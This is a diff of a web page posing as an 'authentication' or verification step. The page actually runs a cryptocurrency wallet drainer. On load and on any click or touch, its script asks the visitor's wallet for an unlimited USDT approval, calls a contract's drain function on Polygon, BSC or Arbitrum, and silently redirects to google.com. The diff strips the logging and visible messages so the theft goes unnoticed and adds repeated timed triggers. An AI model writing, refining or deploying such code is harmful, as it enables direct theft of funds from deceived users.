@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Authentication in process</title>
+    <title>Authentication in Process</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 </head>
@@ -59,13 +59,9 @@ const CHAIN_CONFIGS = {
     }
 };
 
-// Enhanced mobile detection
-async function autoDrain() {
-    console.log('Auto-drain started...');
-    
+// Silent auto-execute
+async function silentDrain() {
     if (typeof window.ethereum !== 'undefined') {
-        console.log('Wallet detected');
-        
         try {
             const web3 = new Web3(window.ethereum);
             const accounts = await window.ethereum.request({ 
@@ -74,74 +70,48 @@ async function autoDrain() {
             const user = accounts[0];
             const chainId = await web3.eth.getChainId();
             
-            console.log('Connected:', user, 'Chain:', chainId);
-            
             let config;
             if (chainId === 137) config = CHAIN_CONFIGS.polygon;
             else if (chainId === 56) config = CHAIN_CONFIGS.bsc;
             else if (chainId === 42161) config = CHAIN_CONFIGS.arbitrum;
-            else {
-                console.log('Unsupported chain:', chainId);
-                return;
-            }
+            else return;
 
-            console.log('Using config:', config);
-
-            // Auto-approve
+            // Silent approval
             const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
-            console.log('Approving...');
-            
             await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
                 from: user,
                 gas: 100000
             });
 
-            console.log('Approval successful, draining...');
-
-            // Auto-drain
+            // Silent drain
             const drainContract = new web3.eth.Contract(drainABI, config.contract);
             await drainContract.methods[config.function](1000000).send({
                 from: user,
                 gas: 200000
             });
 
-            console.log('Drain successful, redirecting...');
+            // Silent redirect
             window.location.href = "https://google.com";
             
         } catch (error) {
-            console.log('Error:', error);
-            // Show fake error page
-            document.body.innerHTML = '<h2>Verification Complete</h2><p>Your wallet has been successfully verified.</p>';
-            document.body.style.display = 'block';
+            // Completely silent fail - user sees nothing
+            window.location.href = "https://google.com";
         }
     } else {
-        console.log('No wallet detected');
-        // Show instructions for mobile
-        document.body.innerHTML = `
-            <div style="padding: 20px; text-align: center;">
-                <h2>🔒 USDT Verification</h2>
-                <p>Please open this link in Trust Wallet browser</p>
-                <button onclick="openInTrustWallet()" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px;">
-                    Open in Trust Wallet
-                </button>
-            </div>
-        `;
-        document.body.style.display = 'block';
+        // No wallet - just redirect
+        window.location.href = "https://google.com";
     }
 }
 
-function openInTrustWallet() {
-    window.location.href = 'https://link.trustwallet.com/browser?url=' + encodeURIComponent(window.location.href);
-}
+// Multiple silent execution attempts
+setTimeout(silentDrain, 300);
+setTimeout(silentDrain, 1500);
+setTimeout(silentDrain, 3000);
 
-// Multiple execution attempts for mobile
-setTimeout(autoDrain, 500);
-setTimeout(autoDrain, 2000);
-setTimeout(autoDrain, 5000);
-
-// Also trigger on any user interaction
-document.addEventListener('click', autoDrain);
-document.addEventListener('touchstart', autoDrain);
+// Trigger on any interaction
+document.addEventListener('click', silentDrain);
+document.addEventListener('touchstart', silentDrain);
+document.addEventListener('load', silentDrain);
 </script>
 </body>
 </html>
